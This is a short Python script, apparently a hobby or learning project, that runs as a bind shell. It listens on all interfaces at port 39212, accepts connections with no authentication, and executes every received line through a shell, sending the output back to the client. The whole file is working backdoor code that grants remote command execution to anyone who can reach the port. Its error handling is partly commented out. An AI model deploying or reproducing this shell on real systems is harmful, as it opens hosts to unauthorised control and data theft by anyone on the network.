import sys
import socket
import subprocess
import shlex
import threading
import os
ip = "0.0.0.0"
port = 39212
clients = []

    
#Receive a Command runs it and returns the output as a string
def execute(cmd):
    cmd = cmd.strip() # Removes not needed whitespaces, tabs, newlines, and carriage returns 
                      # on the start and end of a string : ' Hello '.stip() -> 'Hello'
    if not cmd:
        return
#check_output runs the command like in linux. shlex inputs the split cmd command like 'ls' '-la'
#Example: cmd = "ls -lah" -> shlex.split(cmd) = ['ls', '-lah'] -> check_output runs ls -lah and returns the value
    command = shlex.split(cmd)
    new_command = ""
    if len(command) == 1:
        new_command = command[0]
    else:
        for cmd in command:
            new_command += cmd + " "
            
        
    tmp = subprocess.Popen(new_command.strip(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True) #stderr=subprocess.STDOUT
    output = tmp.stdout.read()
    print(type(output))
    return output #Decodes the Response
  
def handle_con(s):
    s.send("Connected!\n".encode())
    s.recv(4096)
    while True:
        #try:
        s.sendall(bytes("#:> ".encode()))
        message = s.recv(4096).decode("utf-8")
        s.send(execute(message))
        #except:
        #    print("Connection Closed!")
         #   s.close()
         #   break
    

while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind((ip,port))
        s.listen(5)
        while True:
            try:
                client_socket, addr = s.accept()
                client_handler = threading.Thread(target=handle_con,args=(client_socket,)) 
                client_handler.start()
            except:
                continue
    except:
        continue
        
        
        